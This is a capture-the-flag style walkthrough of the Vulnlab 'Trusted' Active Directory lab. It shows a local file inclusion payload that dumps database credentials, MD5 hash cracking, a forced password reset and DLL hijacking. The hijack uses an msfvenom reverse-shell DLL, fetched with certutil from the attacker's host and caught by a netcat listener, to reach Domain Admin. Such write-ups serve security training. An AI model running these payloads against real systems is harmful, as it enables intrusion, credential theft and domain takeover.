---
title: Trusted - Vulnlab
date: 2024-06-05 15:20:37
tags: [vulnlab, Easy, CHAIN]
categories: vulnlab
keywords: 'Vulnlab, Easy, Windows'
description: This chain was relatively fun, however it's a REALLY long one. That being said I still think it was a great learning experience, as I've learned how to perform pen-testing exploits that I've only heard brief snippets about (yet never done them practically). This machine includes exploits such as Local File Inclusion and DLL Hijacking, both of which are actually commonly seen vulnerabilities if not taken into consideration properly by developers.
cover: /images/vulnlab/trusted-vl/trusted_slide.png
top_img: /images/cyberpunk-red.jpg
toc: true
toc_number: false
---

This chain was relatively fun, however it's a REALLY long one. That being said I still think it was a great learning experience, as I've learned how to perform pen-testing exploits that I've only heard brief snippets about (yet never done them practically). This machine includes exploits such as Local File Inclusion and DLL Hijacking, both of which are actually commonly seen vulnerabilities if not taken into consideration properly by developers.

# Enumeration

Running our NMAP scans for host discovery for both machines.
`sudo nmap (IP) -A -oN init_scan_(1/2).txt`
Also note, the IP addresses might change due to some breaks I take in between completing this chain.

```
Nmap scan report for 10.10.155.37
Host is up (0.10s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-01 15:42:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=trusteddc.trusted.vl
| Not valid before: 2024-04-30T15:22:54
|_Not valid after:  2024-10-30T15:22:54
| rdp-ntlm-info: 
|   Target_Name: TRUSTED
|   NetBIOS_Domain_Name: TRUSTED
|   NetBIOS_Computer_Name: TRUSTEDDC
|   DNS_Domain_Name: trusted.vl
|   DNS_Computer_Name: trusteddc.trusted.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-05-01T15:42:31+00:00
|_ssl-date: 2024-05-01T15:42:40+00:00; +2s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/1%OT=53%CT=1%CU=41302%PV=Y%DS=2%DC=T%G=Y%TM=66326
OS:2F1%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS
OS:=A)SEQ(SP=FF%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=FF%GCD=1%ISR=
OS:109%TI=RD%CI=I%II=I%TS=C)OPS(O1=M4D4NW8ST11%O2=M4D4NW8ST11%O3=M4D4NW8NNT
OS:11%O4=M4D4NW8ST11%O5=M4D4NW8ST11%O6=M4D4ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF
OS:%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M4D4NW8NNS%CC=Y%Q=)T
OS:1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%
OS:O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80
OS:%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
OS:=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: TRUSTEDDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-01T15:42:33
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   105.46 ms 10.8.0.1
2   105.84 ms 10.10.155.37

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 169.08 seconds

Nmap scan report for 10.10.155.38
Host is up (0.10s latency).
Not shown: 985 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
| http-title: Welcome to XAMPP
|_Requested resource was http://10.10.155.38/dashboard/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-01 15:43:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
| tls-alpn: 
|_  http/1.1
| http-title: Welcome to XAMPP
|_Requested resource was https://10.10.155.38/dashboard/
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 9
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, ODBCClient, InteractiveClient, SupportsTransactions, ConnectWithDatabase, FoundRows, SupportsLoadDataLocal, IgnoreSigpipes, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: n;xn=$:7D2kEU_Z'SJ[i
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-05-01T15:43:35+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=labdc.lab.trusted.vl
| Not valid before: 2024-04-30T15:22:56
|_Not valid after:  2024-10-30T15:22:56
| rdp-ntlm-info: 
|   Target_Name: LAB
|   NetBIOS_Domain_Name: LAB
|   NetBIOS_Computer_Name: LABDC
|   DNS_Domain_Name: lab.trusted.vl
|   DNS_Computer_Name: labdc.lab.trusted.vl
|   DNS_Tree_Name: trusted.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-05-01T15:43:26+00:00
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/1%OT=53%CT=1%CU=41334%PV=Y%DS=2%DC=T%G=Y%TM=66326
OS:329%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S%T
OS:S=A)SEQ(SP=105%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=105%GCD=2%I
OS:SR=105%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M4D4NW8ST11%O2=M4D4NW8ST11%O3=M4D
OS:4NW8NNT11%O4=M4D4NW8ST11%O5=M4D4NW8ST11%O6=M4D4ST11)WIN(W1=FFFF%W2=FFFF%
OS:W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M4D4NW8NNS%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=
OS:S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF
OS:=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: LABDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-01T15:43:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 1s

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   105.77 ms 10.8.0.1
2   105.78 ms 10.10.155.38

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.35 seconds
```

After our initial NMAP scan, we can see there are two devices that are up. Both have LDAP and are a part of a domain. Both of these machines seem to be domain controllers, the first being `trusteddc.trusted.vl` and the second being `labdc.lab.trusted.vl`. On the second machine, it seems that we have port 80 open, so we'll look at that for the foothold of our attack path. Would like to note that the name of the chain is `Trusted` and we have two DCs, meaning we'll probably have to exploit some form of domain trust or delegation between the two DCs.

Upon enumerating the website, we've seem to have found a landing page for XAMPP/Maria DB (MySQL). Would like to note that port 3306 `MySQL` is open on this machine.
`gobuster dir -u http://10.10.155.38 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`

```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 334] [--> http://10.10.155.38/img/]
/dev                  (Status: 301) [Size: 334] [--> http://10.10.155.38/dev/]
/examples             (Status: 503) [Size: 401]
/licenses             (Status: 403) [Size: 420]
/dashboard            (Status: 301) [Size: 340] [--> http://10.10.155.38/dashboard/]
/%20                  (Status: 403) [Size: 301]
/IMG                  (Status: 301) [Size: 334] [--> http://10.10.155.38/IMG/]
/*checkout*           (Status: 403) [Size: 301]
/Img                  (Status: 301) [Size: 334] [--> http://10.10.155.38/Img/]
/phpmyadmin           (Status: 403) [Size: 301]
/webalizer            (Status: 403) [Size: 301]
/*docroot*            (Status: 403) [Size: 301]
/*                    (Status: 403) [Size: 301]
/con                  (Status: 403) [Size: 301]
/Dashboard            (Status: 301) [Size: 340] [--> http://10.10.155.38/Dashboard/]
```

The `dev` directory seems to be relatively interesting, as I don't commonly see these on default Apache websites. Navigating to it seems to direct us to a website titled `Manes Winchester Family Law Firm`, with directories `Home`, `About`, and `Contact`. Not only that, but it seems that we immediately see a message on the bottom of the `Home` page from one of the web developers.

![](/images/vulnlab/trusted-vl/b.jpg)

This gives me confidence in assuming that with all we know, the attack path is some form of SQL vulnerability (could be SQL injection or by exploiting the `mysql_native_password` authentication plugin). Let's try to look around the website some more and see if we can find any SQL vulnerabilities, I'll enumerate a bit and see what I can find.

Let's run a `gobuster` scan against `/dev` to see if we can find this database connection.
`gobuster dir -u http://10.10.155.38/dev -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x 'php'`

```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 341] [--> http://10.10.155.38/dev/images/]
/Images               (Status: 301) [Size: 341] [--> http://10.10.155.38/dev/Images/]
/css                  (Status: 301) [Size: 338] [--> http://10.10.155.38/dev/css/]
/db.php               (Status: 200) [Size: 22]
/IMAGES               (Status: 301) [Size: 341] [--> http://10.10.155.38/dev/IMAGES/]
/%20                  (Status: 403) [Size: 301]
/*checkout*           (Status: 403) [Size: 301]
/*checkout*.php       (Status: 403) [Size: 301]
/CSS                  (Status: 301) [Size: 338] [--> http://10.10.155.38/dev/CSS/]
/*docroot*            (Status: 403) [Size: 301]
/*docroot*.php        (Status: 403) [Size: 301]
/DB.php               (Status: 200) [Size: 22]
```

# PHP SQLi

Usually whenever you look around for SQL Injection, you're mainly looking for a parameter to inject content into, such as `name` or `id`. This was not the case for us, as `db.php` did not have any other parameters that we can place anything into. The only result we receive from accessing `db.php` is a `Connection successful` message, however there's pretty much nothing we can do with it.

![](/images/vulnlab/trusted-vl/c.jpg)

That being said, there is one webpage that does have some parameter, and it seemed to be the only parameter amongst all of the webpages I could find.
`http://10.10.162.38/dev/index.html?view=contact.html`

This was the contact page from the landing website directory in `/dev`. Since we have a `?view` parameter, there's an opportunity to exploit LFI.

To those who are not aware, LFI (Local File Inclusion) is a web-application vulnerability that allows us to traverse local files on the victim's machine through URL or website parameters. We can then dump the contents of any file we have access to straight onto the webpage.

Let's test this out on that `contact.html` page we were referring to earlier. We'll try to access `C:\Users` to determine if we can see the list of all users we can log onto. (Remember, this is a Windows machine, otherwise on Linux we would just dump `/etc/passwd`.)
`http://10.10.162.38/dev/index.html?view=C:\Users`

![](/images/vulnlab/trusted-vl/d.jpg)

It seems that we don't have any permissions to view it, however we did get some vital information from this error. The local path for the website seems to be `C:\xampp\htdocs\dev`. In that case, let's try to access that `db.php` page from here and view it's contents.
`http://10.10.162.38/dev/index.html?view=C:\xampp\htdocs\dev\db.php`

![](/images/vulnlab/trusted-vl/e.jpg)

# SQLi PHP Filter Bypass

It seems like it works! With that in mind, we can dump all the contents from this specific file by encoding it the base64 using `php://filter`. Note that we can use a `php://filter` to query database results, in this case we are querying the contents of __THIS SPECIFIC FILE__. It was a bit confusing for me to understand at first, however since there is a database connection occurring from this specific file we can assume that the credentials are being matched somewhere in `db.php`'s code.

`http://10.10.162.38/dev/index.html?view=php://filter/convert.base64-encode/resource=C:/xampp/htdocs/dev/db.php`
So to recap, we're doing the following in this URL:
1. Use the view parameter to start the LFI statement.
2. Use a PHP filter to convert all contents that we dump to base64.
3. Using the parameter `resource` to say that we want to dump all contents of `db.php` to base64.

![](/images/vulnlab/trusted-vl/f.jpg)

Looks as though the contents were dumped to the website, meaning we can decode this and see the real contents of `db.php`.
`PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkI[...snip...]Y29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4=`

From here, it's just a simple base64 decode in our terminal to find out the contents.
```
echo "PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIlN1cGVyU2VjdXJlTXlTUUxQYXNzdzByZDEzMzcuIjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkc2VydmVybmFtZSwgJHVzZXJuYW1lLCAkcGFzc3dvcmQpOw0KDQppZiAoISRjb25uKSB7DQogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4=" | base64 -d
```

```
<?php 
$servername = "localhost";
$username = "root";
$password = "[...snip...]";

$conn = mysqli_connect($servername, $username, $password);

if (!$conn) {
  die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
?>
```

# MySQL Enumeration

If you remember from earlier, our NMAP scan told us earlier that the `MySQL` service was public facing. We can attempt to authenticate to it using the credentials we have to see what else we may have access to.
`mysql -h 10.10.162.38 -u 'root' -p`

This gives us access to the `MariaDB` database, to which we can look around for any credentials to the Active Directory instance.
Upon some enumerating, I found some credentials in the `news` database.
`select * from users;`

```
+----+------------+--------------+-----------+----------------------------------+
| id | first_name | short_handle | last_name | password                         |
+----+------------+--------------+-----------+----------------------------------+
|  1 | Robert     | rsmith       | Smith     | [...snip...]                     |
|  2 | Eric       | ewalters     | Walters   | [...snip...]                     |
|  3 | Christine  | cpowers      | Powers    | [...snip...]                     |
+----+------------+--------------+-----------+----------------------------------+
```

Originally I had thought that these hashes were LM hashes, however upon testing them with `crackmapexec` and `hashcat auto-detect mode`, it seems that they may very well be another hashing algorithm. After a bit of testing with `jtr` it seems that this specific hashing algorithm is `Raw-MD5`
`john rsmith.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5`

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
[...snip...]       (?)     
1g 0:00:00:00 DONE (2024-05-02 01:41) 1.666g/s 18487Kp/s 18487Kc/s 18487KC/s IHav.One*Q..IHATESPIDERS
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

This gives us the plaintext of `rsmith`'s password, which we can use to do dump a lot of other things around this specific domain controller.

Testing the creds to these with CrackMapExec, we can see that these specific creds are valid to LDAP.
`crackmapexec ldap 10.10.157.166 -u 'rsmith' -p '[...snip...]'`

```
SMB         10.10.157.166   445    LABDC            [*] Windows Server 2022 Build 20348 x64 (name:LABDC) (domain:lab.trusted.vl) (signing:True) (SMBv1:False)
LDAP        10.10.157.166   389    LABDC            [+] lab.trusted.vl\rsmith:[...snip...]
```

Now that we have verified that `rsmith`'s creds are eligible to authenticate to LDAP, we can now use these same credentials to dump LDAP and identify all other domain objects.

# Dumping LDAP

Normally you'd be able to use `ldapdomaindump`, however I'm more used to using the Bloodhound-Python ingestor. I've also found that `ldapdomaindump` still does not work after remediating an error that you'll see pretty soon with the Python ingestor. Nonetheless I'd still like to include what the `ldapdomaindump` command would look like in this context.
 `ldapdomaindump -u LABDC\\'rsmith' -p '[...snip...]' ldap://10.10.157.166:389`
`BloodHound.py/bloodhound.py -d 'trusted.vl' -u 'rsmith' -p [...snip...] -c all -ns 10.10.157.166 --zip`
https://github.com/dirkjanm/BloodHound.py

It seems I've encountered an issue that I've never come into contact before. Upon running this command, you'll find that a nameserver error occurs based on an invalid query.
`dns.resolver.NoNameservers: All nameservers failed to answer the query _ldap._tcp.pdc._msdcs.trusted.vl. IN SRV: Server Do53:10.10.157.166@53 answered SERVFAIL`

I couldn't find why this issue occurs, however my guess is that the domain `trusted.vl` is either rerouting or denying all DNS nameserver replies that come into contact with the domain.
We can circumvent this issue by using `dnschef`,  a DNS proxy that will allow us to bind all DNS requests back to localhost instead of making a direct request to the DNS server.

Note that you'll need two terminals to do this, one for initializing the DNS proxy and another for actually utilizing the ingestor.
`dnschef --fakeip 10.10.157.166`
`BloodHound.py/bloodhound.py -d 'lab.trusted.vl' -u 'rsmith' -p '[...snip...]' -c all -ns 127.0.0.1 --zip -dc labdc.lab.trusted.vl`

This is a potential workaround when coming into contact with DNS nameserver resolution errors when coming into contact with errors using the ingestor. While this may not work every time, it is still a method to give a shot.

After receiving the compressed domain dump file, we can import it to Bloodhound and begin enumerating what `rsmith` can do.

In case you are unfamiliar with how to set up Bloodhound, here's a beginner walkthrough to do before the next step in this walkthrough. https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux

After uploading the zip folder to Bloodhound, let's search up the domain object for `rsmith@lab.trusted.vl`. After selecting `Node Info`, we can see that `rsmith` has an1 outbound object control.

![](/images/vulnlab/trusted-vl/g.jpg)

It seems that `rsmith` has `ForceChangePassword` rights onto `ewalters`, one of the other users that we dumped in our enumeration of the SQL instance previously. This outbound object control means exactly what you think it might mean - `rsmith` has the ability to force a password reset on `ewalters`, meaning we can do exactly that.

# ForceChangePassword Object Control

To reset a user's password with this outbound object control, you can use tools such as `rpcclient` or `bloodyad`. I'm more used to using `bloodyad` so that's what we'll use in our situation. `bloodyAD/bloodyAD.py -u 'rsmith' -p '[...snip...]' -d 'lab.trusted.vl' --host 10.10.157.166 set password 'ewalters' 'password123@'`

I changed `ewalters` password to something simple, however you can make it whatever you'd like. If successful, you'll receive a small `[+] Password has changed successfully!` message. This indicates that the password for `ewalters` has been changed amongst the entire domain.

We can now verify that the changes have been made with CrackMapExec. I've decided to use a one-liner with all of the CME services separated by a newline in a text file.
`for line in $(cat cme_services.txt); do crackmapexec $line 10.10.157.166 -u 'ewalters' -p 'password123@'; done`

You'll notice that while RDP is valid (despite Bloodhound telling us that this user has RDP privileges, we can authenticate to WinRM.

```
SMB         10.10.157.166   5985   LABDC            [*] Windows Server 2022 Build 20348 (name:LABDC) (domain:lab.trusted.vl)
HTTP        10.10.157.166   5985   LABDC            [*] http://10.10.157.166:5985/wsman
WINRM       10.10.157.166   5985   LABDC            [+] lab.trusted.vl\ewalters:password123@ (Pwn3d!)
```

So from here we'll use `evil-winrm` to authenticate through WinRM with the `ewalters` user.

`evil-winrm --ip 10.10.157.166 -u 'ewalters' -p 'password123@'`

![](/images/vulnlab/trusted-vl/h.jpg)

# DC1 Host Reconnaissance

While normally we'd get the user flag at this point, `r0BIT` messed around with us and left a fake flag in `ewalters` Desktop directory.

```
*Evil-WinRM* PS C:\Users\ewalters\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\ewalters\Desktop> ls


    Directory: C:\Users\ewalters\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----         9/18/2022   9:12 PM         202492 robitcat.jpg
-a----         9/18/2022   9:11 PM            108 User.txt


c*Evil-WinRM* PS C:\Users\ewalters\Desktop> cat User.txt
|\---/|
| o_o |
 \_^_/
These are not the flags you're looking for.
Take :robitcat: as compensation :).
```

It looks like we'll need to look around a little more and escalate to another user to get the user flag. My guess is that we'll need to get to `cpowers`, who was the third and final user that we were able dumped from the SQL database.

While I was looking around the filesystem for any leads, I stumbled across a folder in the `C:\` directory titled, `AVTest`. This isn't a folder that's here regularly so let's take a look into it a little more.

```
*Evil-WinRM* PS C:\AVTest> ls


    Directory: C:\AVTest


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/14/2022   4:46 PM        4870584 KasperskyRemovalTool.exe
-a----         9/14/2022   7:05 PM            235 readme.txt


*Evil-WinRM* PS C:\AVTest> cat readme.txt
Since none of the AV Tools we tried here in the lab satisfied our needs it's time to clean them up.
I asked Christine to run them a few times, just to be sure.

Let's just hope we don't have to set this lab up again because of this.
```

The `readme.txt` tells us that the AV tools are being disposed of, however it seems that the `cpowers` user will be running this executable a few more times before the dispose is initiated.

In a regular red-teaming context, we need to ensure that we move hastily upon seeing this. We may not know the timeframe when the `cpowers` user is going to execute values.
At the same time, this is a pen-testing lab, so I'm going to assume that there's a scheduled task running every now and then that will execute the file - just my logical thinking though.

Not only that, but if we take a look at `cpowers` in Bloodhound, we can see that they're part of the Domain Admins group for this domain.

![](/images/vulnlab/trusted-vl/i.jpg)

This means that if we compromise `cpowers`, we'll have full control over this domain controller.

Let's examine this file to see if there's anything we can do to escalate our privileges when `cpowers` runs it. Normally I'd just transfer it using a C2 or by using a simple Python server on the Windows machine, however it seems I was unable to find success when trying either of them. Instead we can stand up our own SMB server using Impacket's `smbserver` utility.

Kali - `impacket-smbserver smb share/ -smb2support`
WinRM - `copy KasperskyRemovalTool.exe \\10.8.0.173\smb\KasperskyRemovalTool.exe`

This should download the AV tool into our `share/` directory (that we might need to create locally before setting up the SMB server).

So this next part was where I got confused, as examining this with tools such as Ghidra didn't result in many finds. Usually when it comes to reverse engineering PE32 binaries, you'd want to look specifically at abnormal classes or functions or even DLLs that the binary uses that could be exploited. The only issue is that all of these binary functions for this file seem to be relatively normal or at least don't seem to be noteworthy enough to look into.

Looking into CVE's didn't seem to get me anywhere either, but it started to get a few gears working as to what we could potentially do. https://www.exploit-db.com/exploits/10484
While we know that the starting functions don't seem to be very important, what about the DLLs that are loaded while the file is running? Could these potentially be exploited?

I decided to use ProcMon for this, as we can look specifically at the DLLs that are being ran after we execute the file and while it is running.
Note that I was running my machine through a Kali Linux VM, so I'll need to transfer it to my local Windows 10 host in order to examine it with ProcMon.

# ProcMon Executable Reverse Engineering

There are alternatives to setting up ProcMon for Linux, however I was unable to get it working when I had tried it out initially. I'll still leave the link for it as provided here: https://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file

![](/images/vulnlab/trusted-vl/j.jpg)

Before we run the file, we should make sure that we have the right filters set up since we'll get barraged with internal functions and files that the binary will use during runtime. Go to `Filter > Filter` (or just press `Ctrl + l`

On this screen, we can create filters to view only a section of processes and/or functions that interest us.

![](/images/vulnlab/trusted-vl/k.jpg)

For simplicities sake, I've outlined the filter parameters that we'll need to detect the processes of interest.

`Process Name - contains - Kaspersky -> then Include`
`Path - ends with - .dll -> then Include`

Running the file with these two filters still leaves us with a barrage of information, however you'll notice that many of the DLLs have a `Result` value of `NAME NOT FOUND`. This is particularly interesting, as the `File Path` for the DLL is within the same directory of the binary that was executed.

We'll also put down these results as another filter to see specifically what DLLs these results entail.

`Result - is - NAME NOT FOUND -> then Include`

![](/images/vulnlab/trusted-vl/l.jpg)

There are a numerous amount of DLLs that are executed within the same directory as the binary (my binary is located in `Downloads\kas\`). This presents us with a vulnerability that is also new for my research - DLL Hijacking.

# DLL Hijacking

DLL Hijacking is a Windows application vulnerability that essentially allows an attacker to load malicious DLLs into a process in place of regular DLLs. This can occur in the situation in front of us - when a binary uses DLLs that are located within a modifiable directory that we have access to. By replacing a normal DLL that is used, we can trick the Windows API into running our malicious DLL.

I plan on making a research post about DLL Hijacking in the future, however in the meantime I've referenced a HackTricks post that illustrates it relatively well.
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking

So in that case let's give it a try. We'll start by creating a malicious DLL with `msfvenom`, which can be done using the following command. I initially tried this with replacing `USP10.dll`, however I found that it wouldn't spawn a reverse shell as intended. Instead, we'll use the `KasperskyRemovalToolENU.dll` that is called multiple times during runtime.
`msfvenom -p windows/shell_reverse_tcp LHOST=10.8.0.173 LPORT=9001 -f dll > KasperskyRemovalToolENU.dll`

We'll then set up a Python web server with `python3 -m http.server 9002` to transfer the file.
Also, we'll set up a netcat reverse shell so that when `cpowers` executes the Kaspersky tool binary, we'll get a callback after our malicious DLL is ran.

On Kali - `nc -lvnp 9001`
On WinRM - `certutil.exe -urlcache -f http://10.8.0.173:9002/KasperskyRemovalToolENU.dll KasperskyRemovalToolENU.dll`

After a few seconds of waiting, our netcat listener should spawn a reverse shell as `cpowers`.

![](/images/vulnlab/trusted-vl/m.jpg)

Since we are now a DA, we can read the user flag that is present in the `Administrator` directory.

`PS C:\Windows\system32> cd C:\Users\Administrator\Desktop; cat User.txt`

From here, I stood up a Sliver C2 server to try and enumerate the other domain a little easier.

Note that we couldn't do this previously as `ewalters`, as there was a GPO that restricted us from doing so.
If you're unaware on how to set up a Sliver C2 server, I'll reference the material needed to do so here: https://github.com/BishopFox/sliver
`sliver > mtls`
`generate beacon --mtls 10.8.0.173 --os windows --format exe --arch amd64 --skip-symbols --save (directory of your choice)`

After transferring the file and running it on our reverse shell, we should see a session spawn on Sliver.

![](/images/vulnlab/trusted-vl/n.jpg)

So to start, my first guess is that there's some form of domain trust amongst both domain controllers. I had said this earlier in the machine, just based off the chain's name `Trusted`. There's two (technically three) methods that I know of to enumerate a domain, consisting across all of the shells we have access to.

# Domain Trust Enumeration

We can enumerate the domain locally with `Get-ADTrust`, a regular PowerShell module that is present on this machine. 
`Get-ADTrust -Filter *`

Another is to drop `PowerView` to the machine and then import it.
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
`Import-Module .\PowerView.ps1; Get-DomainTrust`

Finally, we can also use `sharpview`, a .NET version of `PowerView` that is present in Sliver's `armory` function.
`sliver > armory install sharpview`
`sliver > sharpview Get-Domain`
The only issue with `sharpview` is that I was running into an LDAP issue (when running `Get-DomainTrust`, so I'll just use the local `PowerView` option we discussed about previously.

After running `Get-DomainTrust` or `Get-ADTrust`, we receive the following output.

![](/images/vulnlab/trusted-vl/o.jpg)

This means that there is a `Bidirectional` domain trust between both the child domain `lab.trusted.vl` and the parent domain `trusted.vl`. What this essentially means is that both domains `lab.trusted.vl` and `trusted.vl` trust one another - meaning that if you are a Domain Admin in one of the domains, you can also create a TGT for a Domain Admin in the other.

I'd like to create a blog post about this in the future, as the term for this is called `Domain Dominance` and is relatively interesting how you can compromise domains through domain trusts. You can also verify this in `Bloodhound` by looking at the `Map Domain Trusts` in the `Analysis` tab.

![](/images/vulnlab/trusted-vl/p.jpg)

